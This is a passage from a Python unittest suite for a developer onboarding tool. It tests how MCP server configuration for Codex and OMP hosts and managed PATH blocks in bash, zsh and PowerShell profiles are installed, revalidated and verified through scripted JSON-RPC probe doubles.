            ).encode()
            _write(account / ".codex" / "config.toml", inherited)
            # No enabledProviders opt-in: OMP never loads the codex source,
            # so its entries cannot conflict — the provider gate is the
            # loading boundary and the OMP domain installs independently.
            resources = hosts.build_host_resources(
                {"hosts": [host]}, package_root=package
            )
            self.assertEqual(resources[0]["classification"], "missing")
            self.assertEqual(resources[0]["decision"], "install")


    def test_profile_variant_resolves(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _omp_host(base, runtime, profile="work")
            resources = hosts.build_host_resources(
                {"hosts": [host]}, package_root=package
            )
            self.assertEqual(resources[0]["classification"], "missing")
            rendered = hosts.render_resource(resources[0])
            self.assertIn("sbtd-graft", rendered.decode("utf-8"))

    def test_config_outside_resolver_shape_is_blocked_per_domain(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _omp_host(base, runtime)
            host["config"] = str(base / "account" / ".omp" / "other" / "mcp.json")
            # Defense in depth: the engine's own scope validation should have
            # rejected this domain; the host builder blocks just this domain.
            resources = hosts.build_host_resources(
                {"hosts": [host]}, package_root=_package(base)
            )
            self.assertEqual(resources[0]["decision"], "blocked")
            self.assertEqual(resources[0]["details"]["error_code"], "scope-conflict")

    def test_incomplete_runtime_blocks_resource(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _omp_host(base, runtime)
            host["runtime"] = {"python": None, "node": runtime["node"], "cli": runtime["cli"]}
            resources = hosts.build_host_resources(
                {"hosts": [host]}, package_root=_package(base)
            )
            self.assertEqual(resources[0]["decision"], "blocked")
            self.assertEqual(
                resources[0]["details"]["error_code"], "runtime-incomplete"
            )


# ---------------------------------------------------------------------------
# Shell profile resources
# ---------------------------------------------------------------------------


class ShellResourceTests(unittest.TestCase):
    def _scope(self, base: Path, path: Path, shell: str, bin_dir: Path, decision=None):
        profile = {"path": str(path), "shell": shell, "bin": str(bin_dir)}
        scope: dict = {"shell_profiles": [profile]}
        if decision is not None:
            scope["decisions"] = {str(path): decision}
        return scope

    @unittest.skipIf(os.name == "nt", "POSIX PATH retention scenario")
    def test_crlf_profile_preserves_last_original_path_directory(self):
        """U33: inserting PATH must not append CR to an existing directory."""
        for shell in ("bash", "zsh"):
            executable = shutil.which(shell)
            if executable is None:
                continue
            with self.subTest(shell=shell), tempfile.TemporaryDirectory() as directory:
                base = Path(directory).resolve()
                profile, bin_dir, original_bin = base / "profile", base / "bin", base / "old-bin"
                bin_dir.mkdir()
                original_bin.mkdir()
                command = original_bin / "retained-command"
                command.write_bytes(b"#!/bin/sh\nexit 0\n")
                command.chmod(0o755)
                before = b"# existing CRLF comment\r\n"
                _write(profile, before)
                scope = self._scope(base, profile, shell, bin_dir, decision="replace")
                resource = hosts.build_host_resources(scope, package_root=_package(base))[0]
                rendered = hosts.render_resource(resource)
                self.assertTrue(rendered.startswith(before))
                _write(profile, rendered)
                flags = ["--noprofile", "--norc"] if shell == "bash" else ["-f"]
                result = subprocess.run(
                    [executable, *flags, "-c", '. "$1"; command -v retained-command', shell, str(profile)],
                    env={**os.environ, "HOME": str(base), "PATH": os.defpath + ":" + str(original_bin)},
                    capture_output=True, text=True, timeout=30, check=False,
                )
                self.assertEqual(result.returncode, 0, result.stderr)
                self.assertEqual(result.stdout.strip(), str(command))

    @unittest.skipUnless(shutil.which("bash"), "bash required")
    def test_unicode_line_separators_remain_inside_resolved_path(self):
        """U29: shell protocol emits LF, not Unicode line separators."""
        for separator in ("\u2028", "\u0085"):
            with self.subTest(separator=ascii(separator)), tempfile.TemporaryDirectory() as directory:
                base = Path(directory).resolve()
                package = _package(base)
                profile, bin_dir = base / ".bashrc", base / ("bin" + separator + "name")
                bin_dir.mkdir()
                _write_graft(bin_dir)
                scope = self._scope(base, profile, "bash", bin_dir)
                resource = hosts.build_host_resources(scope, package_root=package)[0]
                _write(profile, hosts.render_resource(resource))
                result = hosts.verify_hosts(scope, package_root=package, probe=True)
                self.assertEqual(result["shell_profiles"][0]["status"], "pass", result)

    @unittest.skipUnless(shutil.which("pwsh") or shutil.which("powershell"), "PowerShell required")
    def test_unicode_resolution_uses_utf8_even_with_legacy_console_encoding(self):
        """U29: profile console settings cannot corrupt the probe's wire encoding."""
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile, bin_dir = base / "profile.ps1", base / "bin-é"
            bin_dir.mkdir()
            _write_graft(bin_dir)
            _write(profile, b"[Console]::OutputEncoding=[Text.Encoding]::GetEncoding(1252)\n")
            scope = self._scope(base, profile, "powershell", bin_dir, decision="replace")
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            _write(profile, hosts.render_resource(resource))
            engines = [shutil.which("pwsh") or shutil.which("powershell")]
            if os.name == "nt":
                engines.append(shutil.which("powershell"))
            for executable in dict.fromkeys(engine for engine in engines if engine):
                with self.subTest(executable=Path(executable).name), mock.patch.object(
                    hosts, "_which", return_value=executable,
                ):
                    result = hosts.verify_hosts(scope, package_root=package, probe=True)
                    self.assertEqual(result["shell_profiles"][0]["status"], "pass", result)

    @unittest.skipUnless(os.name == "nt" and shutil.which("powershell"), "Windows PowerShell 5.1 required")
    def test_new_unicode_profile_loads_in_windows_powershell(self):
        """U23/U29: new and existing legacy profiles preserve Unicode PATH."""
        for before in (b"", b"# existing ANSI comment: \xe9\r\n"):
            with self.subTest(existing=bool(before)), tempfile.TemporaryDirectory() as directory:
                base = Path(directory).resolve()
                package = _package(base)
                profile, bin_dir = base / "profile.ps1", base / "bin-é-中文"
                if before:
                    _write(profile, before)
                scope = self._scope(base, profile, "powershell", bin_dir, decision="replace")
                resource = hosts.build_host_resources(scope, package_root=package)[0]
                rendered = hosts.render_resource(resource)
                self.assertTrue(rendered.startswith(before))
                _write(profile, rendered)
                result = subprocess.run(
                    [shutil.which("powershell"), "-NoLogo", "-NoProfile", "-NonInteractive", "-Command",
                     ("[Console]::OutputEncoding=[Text.UTF8Encoding]::new(); "
                      ". $env:SBTD_TEST_PROFILE; "
                      "[Console]::WriteLine($env:PATH.Split([IO.Path]::PathSeparator)[0])")],
                    env={**os.environ, "SBTD_TEST_PROFILE": str(profile)},
                    capture_output=True, timeout=30, check=False,
                )
                self.assertEqual(result.returncode, 0, result.stderr)
                self.assertEqual(result.stdout.decode("utf-8").strip(), str(bin_dir))

    def test_utf8_bom_first_marker_is_replaced_without_losing_bom(self):
        """U23: replacing a first-line owned block retains encoding and foreign bytes."""
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile, bin_dir = base / "profile.ps1", base / "new-bin"
            foreign = b"# private tail\r\n"
            before = (
                b"\xef\xbb\xbf# sbtd-workflow-onboard:path:start\r\n"
                b"$env:PATH = 'old-bin' + [IO.Path]::PathSeparator + $env:PATH\r\n"
                b"# sbtd-workflow-onboard:path:end\r\n" + foreign
            )
            _write(profile, before)
            scope = self._scope(base, profile, "powershell", bin_dir, decision="replace")
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            self.assertEqual(resource["decision"], "replace")
            rendered = hosts.render_resource(resource)
            self.assertTrue(rendered.startswith(b"\xef\xbb\xbf"))
            self.assertIn(foreign, rendered)
            self.assertNotIn(b"'old-bin'", rendered)
            self.assertIn(str(bin_dir).encode("utf-8"), rendered)
            _write(profile, rendered)
            converged = hosts.build_host_resources(scope, package_root=package)[0]
            self.assertEqual(converged["classification"], "current")
            self.assertEqual(hosts.render_resource(converged), rendered)

    def test_missing_bash_profile_installs_idempotent_block(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile = base / ".bashrc"
            bin_dir = base / "bin"
            scope = self._scope(base, profile, "bash", bin_dir)
            resources = hosts.build_host_resources(scope, package_root=package)
            resource = resources[0]
            self.assertEqual(resource["kind"], "shell")
            self.assertEqual(resource["classification"], "missing")
            self.assertEqual(resource["decision"], "install")
            rendered = hosts.render_resource(resource)
            expected = (
                b"# sbtd-workflow-onboard:path:start\n"
                + _posix_path_export(bin_dir)
                + b"# sbtd-workflow-onboard:path:end\n"
            )
            self.assertEqual(rendered, expected)
            _write(profile, rendered)
            converged = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(converged[0]["classification"], "current")
            self.assertEqual(converged[0]["decision"], "keep")
            self.assertEqual(hosts.render_resource(converged[0]), rendered)

    def test_existing_bytes_preserved_and_block_appended(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile = base / ".zshrc"
            bin_dir = base / "bin"
            before = b"# zsh config\xff\xfe\nalias g=git\n"
            _write(profile, before)
            scope = self._scope(base, profile, "zsh", bin_dir, decision="replace")
            resources = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(resources[0]["classification"], "unknown-drift")
            self.assertEqual(resources[0]["decision"], "replace")
            rendered = hosts.render_resource(resources[0])
            self.assertTrue(rendered.startswith(before))
            self.assertIn(b"# sbtd-workflow-onboard:path:start\n", rendered)
            self.assertEqual(rendered.count(b"# sbtd-workflow-onboard:path:start"), 1)

    def test_block_is_placed_after_nvm_initialization(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile = base / ".bashrc"
            bin_dir = base / "bin"
            before = (
                b'export NVM_DIR="$HOME/.nvm"\n'
                b'[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"\n'
                b"alias ll='ls -l'\n"
            )
            _write(profile, before)
            scope = self._scope(base, profile, "bash", bin_dir, decision="replace")
            resources = hosts.build_host_resources(scope, package_root=package)
            rendered = hosts.render_resource(resources[0])
            lines = rendered.split(b"\n")
            start = lines.index(b"# sbtd-workflow-onboard:path:start")
            self.assertGreater(start, lines.index(b'[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"'))
            _write(profile, rendered)
            converged = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(converged[0]["classification"], "current")

    def test_block_moves_after_nvm_when_nvm_added_later(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile = base / ".bashrc"
            bin_dir = base / "bin"
            scope = self._scope(base, profile, "bash", bin_dir)
            resources = hosts.build_host_resources(scope, package_root=package)
            rendered = hosts.render_resource(resources[0])
            nvm = b'export NVM_DIR="$HOME/.nvm"\n'
            _write(profile, rendered + nvm)
            scope = self._scope(base, profile, "bash", bin_dir, decision="replace")
            drifted = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(drifted[0]["classification"], "unknown-drift")
            moved = hosts.render_resource(drifted[0])
            lines = moved.split(b"\n")
            self.assertLess(
                lines.index(b'export NVM_DIR="$HOME/.nvm"'),
                lines.index(b"# sbtd-workflow-onboard:path:start"),
            )
            _write(profile, moved)
            converged = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(converged[0]["classification"], "current")

    def test_posix_bin_with_space_and_apostrophe_is_quoted(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile = base / ".bashrc"
            bin_dir = base / "dir with space" / "it's"
            scope = self._scope(base, profile, "bash", bin_dir)
            resources = hosts.build_host_resources(scope, package_root=package)
            rendered = hosts.render_resource(resources[0])
            self.assertIn(_posix_path_export(bin_dir).rstrip(b"\n"), rendered)

    def test_duplicated_markers_are_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile = base / ".bashrc"
            bin_dir = base / "bin"
            block = (
                b"# sbtd-workflow-onboard:path:start\n"
                + _posix_path_export(bin_dir)
                + b"# sbtd-workflow-onboard:path:end\n"
            )
            _write(profile, block + block)
            scope = self._scope(base, profile, "bash", bin_dir, decision="replace")
            resources = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(resources[0]["decision"], "blocked")
            self.assertEqual(
                resources[0]["details"]["error_code"], "ownership-conflict"
            )

    def test_unpaired_marker_is_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile = base / ".bashrc"
            bin_dir = base / "bin"
            _write(profile, b"# sbtd-workflow-onboard:path:end\n")
            scope = self._scope(base, profile, "bash", bin_dir, decision="replace")
            resources = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(resources[0]["decision"], "blocked")
            self.assertEqual(
                resources[0]["details"]["error_code"], "ownership-conflict"
            )

    def test_legacy_path_lines_reported_outside_block(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile = base / ".bashrc"
            bin_dir = base / "bin"
            before = (
                f"export PATH=\"{bin_dir}:$PATH\"\n".encode()
                + b"# sbtd-workflow-onboard:path:start\n"
                + _posix_path_export(bin_dir)
                + b"# sbtd-workflow-onboard:path:end\n"
            )
            _write(profile, before)
            scope = self._scope(base, profile, "bash", bin_dir)
            resources = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(resources[0]["details"]["legacy_lines"], [1])
            self.assertEqual(resources[0]["classification"], "current")


# ---------------------------------------------------------------------------
# render_resource revalidation
# ---------------------------------------------------------------------------


class RenderResourceTests(unittest.TestCase):
    def test_drift_between_build_and_render_is_state_conflict(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _codex_host(base, runtime)
            resources = hosts.build_host_resources(
                {"hosts": [host]}, package_root=package
            )
            _write(Path(host["config"]), b"# changed\n")
            with self.assertRaises(ContractError) as caught:
                hosts.render_resource(resources[0])
        self.assertEqual(caught.exception.code, "state-conflict")

    def test_launcher_drift_is_runtime_unavailable(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _codex_host(base, runtime)
            resources = hosts.build_host_resources(
                {"hosts": [host]}, package_root=package
            )
            (package / "scripts" / "sbtd_graft_entry.py").write_bytes(b"# drifted\n")
            with self.assertRaises(ContractError) as caught:
                hosts.render_resource(resources[0])
        self.assertEqual(caught.exception.code, "runtime-unavailable")

    def test_package_root_mismatch_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _codex_host(base, runtime)
            resources = hosts.build_host_resources(
                {"hosts": [host]}, package_root=package
            )
            with self.assertRaises(ContractError) as caught:
                hosts.render_resource(resources[0], package_root=base)
        self.assertEqual(caught.exception.code, "invalid-argument")

    def test_rendered_bytes_match_desired_checksum(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _omp_host(base, runtime)
            resources = hosts.build_host_resources(
                {"hosts": [host]}, package_root=package
            )
            rendered = hosts.render_resource(resources[0])
            self.assertEqual(
                hashlib.sha256(rendered).hexdigest(),
                resources[0]["desired"]["checksum"],
            )


# ---------------------------------------------------------------------------
# verify_hosts without probe (strictly read-only)
# ---------------------------------------------------------------------------


class VerifyReadonlyTests(unittest.TestCase):
    def test_aligned_domain_is_unverified_without_probe(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _codex_host(base, runtime)
            scope = {"hosts": [host]}
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            _write(Path(host["config"]), hosts.render_resource(resource))
            result = hosts.verify_hosts(scope, package_root=package)
            self.assertFalse(result["probe"])
            entry = result["hosts"][0]
            self.assertEqual(entry["applicability"], "supported")
            self.assertEqual(entry["disk"]["status"], "aligned")
            self.assertEqual(entry["runtime"], {"status": "unverified"})
            self.assertEqual(entry["host"], {"status": "unverified"})
            self.assertEqual(entry["status"], "unverified")
            self.assertEqual(entry["legacy"]["status"], "none")

    def test_drifted_and_missing_domains_fail_without_probe(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            drifted = _codex_host(base, runtime, host_id="drifted")
            drifted["config_home"] = str(base / "one" / ".codex")
            drifted["config"] = str(base / "one" / ".codex" / "config.toml")
            missing = _codex_host(base, runtime, host_id="missing")
            missing["config_home"] = str(base / "two" / ".codex")
            missing["config"] = str(base / "two" / ".codex" / "config.toml")
            _write(Path(drifted["config"]), b"# user config\n")
            scope = {"hosts": [drifted, missing]}
            result = hosts.verify_hosts(scope, package_root=package)
            by_id = {entry["id"]: entry for entry in result["hosts"]}
            self.assertEqual(by_id["drifted"]["disk"]["status"], "drifted")
            self.assertEqual(by_id["drifted"]["status"], "fail")
            self.assertEqual(by_id["missing"]["disk"]["status"], "missing")
            self.assertEqual(by_id["missing"]["status"], "fail")

    def test_unsupported_platform_reports_without_resources(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            claude = _codex_host(base, runtime, host_id="claude-account")
            claude["platform"] = "claude"
            claude["config_home"] = str(base / "account" / ".claude")
            claude["config"] = str(base / "account" / ".claude" / "claude.json")
            scope = {"hosts": [claude]}
            self.assertEqual(
                hosts.build_host_resources(scope, package_root=package), []
            )
            result = hosts.verify_hosts(scope, package_root=package)
            entry = result["hosts"][0]
            self.assertEqual(entry["applicability"], "unsupported")
            self.assertEqual(entry["status"], "unsupported")
            self.assertEqual(entry["disk"]["status"], "not-applicable")
            self.assertEqual(entry["runtime"]["status"], "not-applicable")
            self.assertEqual(entry["host"]["status"], "not-applicable")
            self.assertEqual(entry["legacy"]["status"], "not-applicable")

    def test_legacy_dimension_lists_retired_entries(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _codex_host(base, runtime)
            legacy_key = "sbtd-graft-a1b2c3d4e5f60718"
            _write(
                Path(host["config"]),
                (
                    f"[mcp_servers.{json.dumps(legacy_key)}]\n"
                    f"command = {json.dumps(runtime['python'])}\n"
                ).encode(),
            )
            result = hosts.verify_hosts({"hosts": [host]}, package_root=package)
            entry = result["hosts"][0]
            self.assertEqual(entry["legacy"]["status"], "present")
            self.assertEqual(entry["legacy"]["entries"], [legacy_key])
            self.assertEqual(entry["status"], "fail")

    def test_domains_are_handled_individually(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            codex = _codex_host(base, runtime)
            # Same account on purpose: an un-opted-in codex source is
            # invisible to the OMP domain (the provider gate is the loading
            # boundary), so both domains coexist independently.
            omp = _omp_host(base, runtime)
            claude = _codex_host(base, runtime, host_id="claude-account")
            claude["platform"] = "claude"
            claude["config_home"] = str(base / "account" / ".claude")
            claude["config"] = str(base / "account" / ".claude" / "claude.json")
            profile = base / ".bashrc"
            bin_dir = base / "bin"
            scope = {
                "hosts": [codex, omp, claude],
                "shell_profiles": [
                    {"path": str(profile), "shell": "bash", "bin": str(bin_dir)}
                ],
            }
            resources = hosts.build_host_resources(scope, package_root=package)
            codex_resource = next(r for r in resources if r["target"] == codex["config"])
            _write(Path(codex["config"]), hosts.render_resource(codex_resource))
            shell_resource = next(r for r in resources if r["kind"] == "shell")
            _write(profile, hosts.render_resource(shell_resource))
            result = hosts.verify_hosts(scope, package_root=package)
            by_id = {entry["id"]: entry for entry in result["hosts"]}
            self.assertEqual(by_id["codex-account"]["disk"]["status"], "aligned")
            self.assertEqual(by_id["codex-account"]["status"], "unverified")
            self.assertEqual(by_id["omp-account"]["disk"]["status"], "missing")
            self.assertEqual(by_id["omp-account"]["status"], "fail")
            self.assertEqual(by_id["claude-account"]["status"], "unsupported")
            self.assertEqual(len(result["shell_profiles"]), 1)
            shell_entry = result["shell_profiles"][0]
            self.assertEqual(shell_entry["disk"]["status"], "aligned")
            self.assertEqual(shell_entry["runtime"]["status"], "not-applicable")
            self.assertEqual(shell_entry["host"], {"status": "unverified"})
            self.assertEqual(shell_entry["status"], "unverified")

    def test_verify_without_probe_writes_nothing(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _codex_host(base, runtime)
            unselected = base / "account" / ".claude.json"
            _write(unselected, b'{"mcpServers": {}}\n')
            scope = {"hosts": [host]}
            before_tree = _tree_bytes(base)
            hosts.verify_hosts(scope, package_root=package)
            self.assertEqual(_tree_bytes(base), before_tree)


# ---------------------------------------------------------------------------
# verify_hosts with probe (scripted doubles; real evidence flow)
# ---------------------------------------------------------------------------


class VerifyProbeTests(unittest.TestCase):
    def _aligned_codex(self, base: Path, runtime, package, skills, project):
        host = _codex_host(
            base, runtime, skills_roots=[skills], project_roots=[project]
        )
        scope = {"hosts": [host], "skills_roots": [str(skills)]}
        resource = hosts.build_host_resources(scope, package_root=package)[0]
        _write(Path(host["config"]), hosts.render_resource(resource))
        return host, scope

    def test_rpc_envelope_types_and_mcp_version_are_authoritative(self):
        """U35: Python Boolean equality cannot substitute a JSON Number ID."""
        cases = (("boolean", "failed"), ("missing-version", "failed"),
                 ("wrong-version", "failed"), ("numeric", "verified"), ("valid", "verified"))
        for case, expected in cases:
            with self.subTest(case=case), tempfile.TemporaryDirectory() as directory:
                base = Path(directory).resolve()
                runtime, package = _runtime(base), _package(base)
                skills = _skills_root(base, ["alpha-skill"])
                project = base / "project"
                project.mkdir()
                _host, scope = self._aligned_codex(base, runtime, package, skills, project)
                rig = _ProbeRig(self, ["alpha-skill"]).install()
                original, codex = rig._mcp_handler, rig._codex_handler

                def mcp(request, original=original, case=case):
                    response = original(request)
                    if response is not None:
                        if case == "boolean" and request["id"] == 1:
                            response["id"] = True
                        elif case == "numeric":
                            response["id"] = float(request["id"])
                        elif case == "missing-version":
                            response.pop("jsonrpc")
                        elif case == "wrong-version":
                            response["jsonrpc"] = "1.0"
                    return response

                def versionless_codex(request, codex=codex):
                    response = codex(request)
                    if response is not None:
                        response.pop("jsonrpc", None)
                    return response

                rig._mcp_handler, rig._codex_handler = mcp, versionless_codex
                with mock.patch.object(hosts, "_HANDSHAKE_TIMEOUT", 0.1):
                    result = hosts.verify_hosts(scope, package_root=package, probe=True)
                checks = result["hosts"][0]["host"]["checks"]
                self.assertEqual(checks["protocol"]["status"], expected, checks)
                self.assertEqual(checks["host_load"]["status"], "verified", checks)

    def test_missing_codex_method_is_unsupported_without_private_error_text(self):
        """U22: unsupported interface is distinct from an ordinary refusal."""
        for code, expected in ((-32601, "unsupported"), (-32602, "failed")):
            with self.subTest(code=code), tempfile.TemporaryDirectory() as directory:
                base = Path(directory).resolve()
                runtime, package = _runtime(base), _package(base)
                skills = _skills_root(base, ["alpha-skill"])
                project = base / "project"
                project.mkdir()
                _host, scope = self._aligned_codex(base, runtime, package, skills, project)
                rig = _ProbeRig(self, ["alpha-skill"]).install()
                original = rig._codex_handler

                def refused(request, original=original, code=code):
                    if request.get("method") == "config/mcpServer/reload":
                        return {"id": request["id"], "error": {"code": code, "message": SECRET}}
                    return original(request)

                rig._codex_handler = refused
                result = hosts.verify_hosts(scope, package_root=package, probe=True)
                self.assertEqual(result["hosts"][0]["host"]["checks"]["host_load"]["status"], expected)
                self.assertEqual(result["hosts"][0]["host"]["status"], expected)
                self.assertEqual(result["hosts"][0]["status"], "unsupported" if code == -32601 else "fail")
                self.assertNotIn(SECRET, json.dumps(result))

    def test_mcp_failed_or_forced_shutdown_is_not_verified(self):
        """U22: valid tools cannot hide a failed or forced process shutdown."""
        for exit_code, forced in ((7, False), (0, True)):
            with self.subTest(exit_code=exit_code, forced=forced), tempfile.TemporaryDirectory() as directory:
                base = Path(directory).resolve()
                runtime, package = _runtime(base), _package(base)
                skills = _skills_root(base, ["alpha-skill"])
                project = base / "project"
                project.mkdir()
                _host, scope = self._aligned_codex(base, runtime, package, skills, project)
                rig = _ProbeRig(self, ["alpha-skill"]).install()
                original = hosts._spawn

                def spawn(argv, original=original, exit_code=exit_code, forced=forced, **kwargs):
                    proc = original(argv, **kwargs)
                    if "app-server" not in argv:
                        proc._exit_code = exit_code
                        if forced:
                            native_wait = proc.wait
                            attempts = 0

                            def wait(timeout=None):
                                nonlocal attempts
                                attempts += 1
                                if attempts == 1:
                                    raise subprocess.TimeoutExpired(argv, timeout)
                                return native_wait(timeout)

                            proc.wait = wait
                    return proc

                with mock.patch.object(hosts, "_spawn", side_effect=spawn):
                    result = hosts.verify_hosts(scope, package_root=package, probe=True)
                self.assertEqual(result["hosts"][0]["host"]["checks"]["protocol"]["status"], "failed")
                self.assertTrue(all(proc.returncode is not None for proc in rig.procs))

    def test_mcp_negotiated_version_must_be_supported(self):
        """U22: compatible negotiation may differ from the requested revision."""
        cases = [
            (None, "failed"), ([], "failed"), ("2099-01-01", "failed"),
            ("2026-07-28", "failed"),
            ("2024-11-05", "verified"), ("2025-03-26", "verified"),
            ("2025-06-18", "verified"), ("2025-11-25", "verified"),
        ]
        for version, expected in cases:
            with self.subTest(version=version), tempfile.TemporaryDirectory() as directory:
                base = Path(directory).resolve()
                runtime, package = _runtime(base), _package(base)
                skills = _skills_root(base, ["alpha-skill"])
                project = base / "project"
                project.mkdir()
                _host, scope = self._aligned_codex(base, runtime, package, skills, project)
                rig = _ProbeRig(self, ["alpha-skill"]).install()
                original = rig._mcp_handler

                def negotiated(request, original=original, version=version):
                    response = original(request)
                    if request.get("method") == "initialize":
                        if version is None:
                            response["result"].pop("protocolVersion")
                        else:
                            response["result"]["protocolVersion"] = version
                    return response

                rig._mcp_handler = negotiated
                result = hosts.verify_hosts(scope, package_root=package, probe=True)
                self.assertEqual(result["hosts"][0]["host"]["checks"]["protocol"]["status"], expected)

    def test_method_data_only_reply_is_not_success_evidence(self):
        """U22: OMP's data envelope cannot satisfy method-response contracts."""
        for adapter, check in (("_mcp_handler", "protocol"), ("_codex_handler", "host_load")):
            with self.subTest(adapter=adapter), tempfile.TemporaryDirectory() as directory:
                base = Path(directory).resolve()
                runtime, package = _runtime(base), _package(base)
                skills = _skills_root(base, ["alpha-skill"])
                project = base / "project"
                project.mkdir()
                _host, scope = self._aligned_codex(base, runtime, package, skills, project)
                rig = _ProbeRig(self, ["alpha-skill"]).install()
                original = getattr(rig, adapter)

                def data_only(request, original=original):
                    response = original(request)
                    if response is not None:
                        response["data"] = response.pop("result")
                    return response

                setattr(rig, adapter, data_only)
                result = hosts.verify_hosts(scope, package_root=package, probe=True)
                self.assertEqual(result["hosts"][0]["host"]["checks"][check]["status"], "failed")

    def test_probe_pass_reports_distinct_verified_checks(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["alpha-skill"])
            project = base / "project"
            project.mkdir()
            _host, scope = self._aligned_codex(base, runtime, package, skills, project)
            rig = _ProbeRig(self, ["alpha-skill"]).install()
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            self.assertTrue(result["probe"])
            entry = result["hosts"][0]
            self.assertEqual(entry["status"], "pass")
            self.assertEqual(entry["runtime"], {"status": "verified"})
            checks = entry["host"]["checks"]
            self.assertEqual(checks["binding"]["status"], "verified")
            self.assertEqual(checks["protocol"]["status"], "verified")
            self.assertEqual(checks["protocol"]["tools"], PINNED_TOOLS)
            self.assertEqual(checks["protocol"]["server_version"], GRAFT_VERSION)
            self.assertEqual(checks["host_load"]["status"], "verified")
            self.assertEqual(checks["host_load"]["reload"], "ok")
            self.assertEqual(
                checks["host_load"]["evidence_scope"],
                "isolated-host/selected-projection",
            )
            self.assertEqual(checks["host_load"]["exit"], 0)
            self.assertEqual(checks["skills"]["status"], "verified")
            self.assertEqual(checks["skills"]["skills"], ["alpha-skill"])
            self.assertEqual(entry["host"]["status"], "verified")
            live_reload = entry["host"]["live_reload"]
            self.assertEqual(live_reload["status"], "unverified")
            self.assertEqual(
                live_reload["reason"], "original-domain-not-authorized"
            )
            self.assertNotEqual(live_reload["status"], "unsupported")
            self.assertEqual(len(rig.spawns), 2)
            methods = {
                request.get("method")
                for proc in rig.procs
                for request in proc.requests
                if request.get("method")
            }
            self.assertIn("config/mcpServer/reload", methods)
            self.assertIn("mcpServerStatus/list", methods)
            self.assertNotIn(SECRET, json.dumps(result))

    def test_missing_host_cli_is_unavailable_not_failed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["alpha-skill"])
            project = base / "project"
            project.mkdir()
            _host, scope = self._aligned_codex(base, runtime, package, skills, project)
            rig = _ProbeRig(self, ["alpha-skill"]).install()
            rig.codex_available = False
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            entry = result["hosts"][0]
            checks = entry["host"]["checks"]
            self.assertEqual(checks["host_load"]["status"], "unavailable")
            self.assertEqual(checks["host_load"]["reason"], "host-cli-not-found")
            self.assertEqual(checks["skills"]["status"], "unavailable")
            self.assertEqual(checks["protocol"]["status"], "verified")
            self.assertEqual(entry["status"], "unavailable")

            self.assertEqual(
                checks["host_load"]["evidence_scope"],
                "isolated-host/selected-projection",
            )
            self.assertEqual(
                entry["host"]["live_reload"],
                {"status": "unverified", "reason": "original-domain-not-authorized"},
            )

    def test_protocol_evidence_mismatch_is_failed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["alpha-skill"])
            project = base / "project"
            project.mkdir()
            _host, scope = self._aligned_codex(base, runtime, package, skills, project)
            rig = _ProbeRig(self, ["alpha-skill"]).install()
